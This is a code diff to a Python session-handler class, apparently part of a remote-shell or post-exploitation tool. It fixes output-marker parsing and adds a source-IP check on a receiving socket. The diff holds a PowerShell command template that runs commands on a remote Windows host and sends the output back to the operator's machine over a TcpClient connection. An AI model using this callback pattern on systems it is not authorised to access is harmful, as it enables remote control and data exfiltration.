@@ -277,6 +277,7 @@ class KoiModule(ABC):
 
         eol = self.session.eol
         enc = self.session.encoding
+
         self.session.conn.sendall((cmd + eol).encode(enc))
 
         buf = b""
@@ -300,11 +301,14 @@ class KoiModule(ABC):
                 if not text or "Write-Host" in text:
                     continue
                 if marker in text:
-                    result = "\n".join(collected)
-                    if self._logger and result:
-                        self._logger.log_event(f"exec  {ps_expr}")
-                        self._logger.log_output(result.encode("utf-8", errors="replace"))
-                    return result
+                    if text == marker:
+                        result = "\n".join(collected)
+                        if self._logger and result:
+                            self._logger.log_event(f"exec  {ps_expr}")
+                            self._logger.log_output(result.encode("utf-8", errors="replace"))
+                        return result
+                    collected.clear()
+                    continue
                 collected.append(text)
 
         result = "\n".join(collected)
@@ -318,7 +322,7 @@ class KoiModule(ABC):
         """_win_query for upgraded sessions: PowerShell pushes the result to a
         local socket, bypassing the VT100 stream."""
         local_ip = self._get_local_ip()
-        with TCPReceiveServer(timeout=timeout) as srv:
+        with TCPReceiveServer(timeout=timeout, expected_ip=self.session.addr[0]) as srv:
             ps_cmd = (
                 f"$_r=({ps_expr})|Out-String;"
                 f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{srv.port});"
@@ -673,6 +677,15 @@ class KoiModule(ABC):
                 else:
                     output_lines.append(text)
 
+        if buf:
+            text = buf.decode(enc, errors="replace").strip("\r\n ")
+            text = _PS_PROMPT.sub("", text).strip()
+            if text:
+                if match := done_re.match(text):
+                    returncode = int(match.group(1))
+                    return self._build_result(
+                        command, returncode, output_lines, started, _silent,
+                    )
         return self._build_result(command, returncode, output_lines, started, _silent)
 
     @_owns_io
@@ -681,7 +694,7 @@ class KoiModule(ABC):
         done_re = re.compile(rf"{re.escape(marker)}:(-?\d+)")
         local_ip = self._get_local_ip()
 
-        with TCPReceiveServer(timeout=timeout) as srv:
+        with TCPReceiveServer(timeout=timeout, expected_ip=self.session.addr[0]) as srv:
             ps_cmd = (
                 f"$_r=(& {{ {command} }}) 2>&1 | Out-String;"
                 f"$_rc={_PS_RC_ASSIGN};"
